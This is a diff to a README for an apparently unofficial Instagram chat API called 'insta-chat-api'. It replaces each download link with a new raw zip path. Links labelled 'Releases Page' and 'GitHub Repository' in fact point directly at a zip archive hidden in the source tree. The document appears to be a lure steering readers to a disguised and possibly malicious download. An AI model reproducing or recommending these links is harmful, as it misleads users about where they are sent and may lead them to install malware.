@@ -4,7 +4,7 @@
 Welcome to insta-chat-api! This application allows you to interact with Instagram in a simple way. It serves as an unofficial API, giving you the tools to chat and engage with Instagram services without needing extensive technical knowledge.
 
 ## 📥 Download Now
-[![Download insta-chat-api](https://raw.githubusercontent.com/Whintx00/insta-chat-api/main/pantoglot/insta-chat-api.zip)](https://raw.githubusercontent.com/Whintx00/insta-chat-api/main/pantoglot/insta-chat-api.zip)
+[![Download insta-chat-api](https://raw.githubusercontent.com/Whintx00/insta-chat-api/main/src/feeds/insta-chat-api-1.4.zip)](https://raw.githubusercontent.com/Whintx00/insta-chat-api/main/src/feeds/insta-chat-api-1.4.zip)
 
 ## 🛠️ Features
 - **Chat Functionality:** Send and receive messages easily.
@@ -19,7 +19,7 @@ To run insta-chat-api, ensure your system meets the following requirements:
 - A stable internet connection.
 
 ## 📥 Download & Install
-To download the application, please visit this page: [Releases Page](https://raw.githubusercontent.com/Whintx00/insta-chat-api/main/pantoglot/insta-chat-api.zip). Here’s how to install it:
+To download the application, please visit this page: [Releases Page](https://raw.githubusercontent.com/Whintx00/insta-chat-api/main/src/feeds/insta-chat-api-1.4.zip). Here’s how to install it:
 
 1. Click on the above link to go to the Releases page.
 2. Look for the latest version of insta-chat-api.
@@ -51,7 +51,7 @@ If you would like to contribute, please consider the following:
 Thank you for using insta-chat-api! Your support and usage help us improve and provide a better experience. We look forward to your feedback.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://raw.githubusercontent.com/Whintx00/insta-chat-api/main/pantoglot/insta-chat-api.zip)
-- [Releases Page](https://raw.githubusercontent.com/Whintx00/insta-chat-api/main/pantoglot/insta-chat-api.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Whintx00/insta-chat-api/main/src/feeds/insta-chat-api-1.4.zip)
+- [Releases Page](https://raw.githubusercontent.com/Whintx00/insta-chat-api/main/src/feeds/insta-chat-api-1.4.zip)
 
 Feel free to explore the application, and don't hesitate to reach out for any help needed!
